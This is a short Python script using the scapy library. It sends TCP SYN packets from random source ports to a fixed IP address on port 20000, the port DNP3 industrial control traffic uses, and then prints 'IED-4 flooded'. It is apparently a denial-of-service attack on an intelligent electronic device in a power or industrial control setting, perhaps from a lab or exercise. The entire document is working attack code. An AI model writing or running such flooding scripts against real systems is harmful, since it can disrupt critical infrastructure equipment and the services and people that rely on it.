from scapy.all import *
ip = IP(dst='6.87.152.210')
for _ in range(0,20):
    src_port = random.randint(20,65535)
    transport = TCP(sport=src_port, dport=20000, flags='S')
    send(ip/transport)
print('IED-4 flooded')
